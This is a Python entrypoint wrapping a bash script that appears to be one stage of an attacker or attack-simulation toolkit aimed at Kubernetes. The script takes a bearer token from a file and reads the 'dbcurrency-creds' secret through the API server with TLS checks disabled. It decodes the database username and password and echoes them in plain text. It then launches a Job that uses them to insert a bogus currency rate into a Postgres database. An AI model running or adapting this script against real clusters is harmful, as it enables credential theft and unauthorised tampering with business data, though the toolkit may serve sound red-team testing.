#!/usr/bin/env python3
"""Python entrypoint for job-creation.sh."""

from __future__ import annotations

import os
import stat
import subprocess
import sys
import tempfile
from pathlib import Path

_SCRIPT = r"""#!/usr/bin/env bash
set -euo pipefail

if [ -f ${ATTACKER_LIB_DIR:-/opt/attacker-lib}/common/require-tools.sh ]; then
  # Prefer the shared helper when the script runs inside the attacker image.
  source ${ATTACKER_LIB_DIR:-/opt/attacker-lib}/common/require-tools.sh
else
  # Remote stdin execution may not have the helper file available.
  require_tools() {
    local missing=()
    local tool
    for tool in "$@"; do
      command -v "$tool" >/dev/null 2>&1 || missing+=("$tool")
    done
    if (( ${#missing[@]} > 0 )); then
      echo "Missing required tools: ${missing[*]}" >&2
      exit 1
    fi
  }
fi

# ===== Config =====
API_SERVER="https://$CONTROL_PLANE_NODE:$CONTROL_PLANE_PORT"
NS="${NSPROTO:-app}"

SECRET="dbcurrency-creds"
JOB_NAME="insert-currency-rate-$(date +%Y%m%d%H%M%S)"
PGHOST="postgres.$NSDATA.svc.cluster.local"
PGPORT="5432"
PGDATABASE="currency"
SQL_STMT="INSERT INTO currency (code, rate) VALUES ('NUL', 0);"
TOKEN="$(cat $DATA_PATH/KC3/tokenCurrency)"

# Installing dependencies and setup
require_tools curl jq base64
mkdir -p "$DATA_PATH/KC3"

echo ">> Reading ${SECRET} in namespace ${NS}..."
SECRET_JSON=$(curl -sk \
  --header "Authorization: Bearer $TOKEN" \
  $API_SERVER/api/v1/namespaces/$NS/secrets/$SECRET)
# Extraction credentials
USER="$(jq -r '.data.username' <<<"$SECRET_JSON" | base64 -d)"
PASS="$(jq -r '.data.password' <<<"$SECRET_JSON" | base64 -d)"

echo ">> Credenzials extracted (username/password $USER - $PASS)."

JOB_JSON="$(
  jq -n \
    --arg name "$JOB_NAME" \
    --arg ns "$NS" \
    --arg pghost "$PGHOST" \
    --arg pgport "$PGPORT" \
    --arg pgdb "$PGDATABASE" \
    --arg pguser "$USER" \
    --arg pgpass "$PASS" \
    --arg sql "$SQL_STMT" '
{
  apiVersion: "batch/v1",
  kind: "Job",
  metadata: {
    name: $name,
    namespace: $ns,
    labels: { "app.kubernetes.io/name": "insert-currency-rate" }
  },
  spec: {
    backoffLimit: 0,
    ttlSecondsAfterFinished: 300,
    template: {
      spec: {
        restartPolicy: "Never",
        containers: [
          {
            name: "psql",
            image: "postgres:16-alpine",
            env: [
              { name: "PGHOST", value: $pghost },
              { name: "PGPORT", value: $pgport },
              { name: "PGDATABASE", value: $pgdb },
              { name: "PGUSER", value: $pguser },
              { name: "PGPASSWORD", value: $pgpass },
              { name: "SQL", value: $sql }
            ],
            command: [
              "sh","-c",
              "psql \"host=$PGHOST port=$PGPORT dbname=$PGDATABASE user=$PGUSER password=$PGPASSWORD sslmode=disable\" -v ON_ERROR_STOP=1 -c \"$SQL\""
            ]
          }
        ]
      }
    }
  }
}
'
)"

MANIFEST_FILE="$DATA_PATH/KC3/$JOB_NAME.json"
printf '%s\n' "$JOB_JSON" > "$MANIFEST_FILE"
echo ">> Manifest saved in ${MANIFEST_FILE}"

echo ">> Creating Job ${JOB_NAME} in namespace ${NS}..."
CREATE_RESP="$(
  curl -sSk -X POST \
    --header "Authorization: Bearer ${TOKEN}" \
    -H "Content-Type: application/json" \
    -d @"${MANIFEST_FILE}" \
    "${API_SERVER}/apis/batch/v1/namespaces/${NS}/jobs"
)"

if echo "$CREATE_RESP" | jq -e '.kind=="Job"' >/dev/null 2>&1; then
  echo "Job created: ${JOB_NAME}"
else
  echo "Error creating the Job. API answer:"
  echo "$CREATE_RESP" | jq .
  exit 1
fi
"""


def _run_embedded_bash(script: str, argv: list[str]) -> int:
    """Run the embedded legacy payload through Bash with a Python-owned entrypoint."""
    try:
        current = Path(__file__).resolve()
        for parent in current.parents:
            lib_dir = parent / "lib"
            if (lib_dir / "common" / "shell.py").is_file():
                sys.path.insert(0, str(lib_dir))
                break
        from common.shell import run_embedded_bash
        return run_embedded_bash(script, argv)
    except Exception:
        with tempfile.NamedTemporaryFile("w", encoding="utf-8", suffix=".sh", delete=False) as handle:
            handle.write(script)
            path = handle.name
        try:
            Path(path).chmod(Path(path).stat().st_mode | stat.S_IXUSR)
            completed = subprocess.run(["/usr/bin/env", "bash", path, *argv], text=True)
            return int(completed.returncode)
        finally:
            try:
                os.unlink(path)
            except FileNotFoundError:
                pass


def main() -> None:
    raise SystemExit(_run_embedded_bash(_SCRIPT, sys.argv[1:]))


if __name__ == "__main__":
    main()
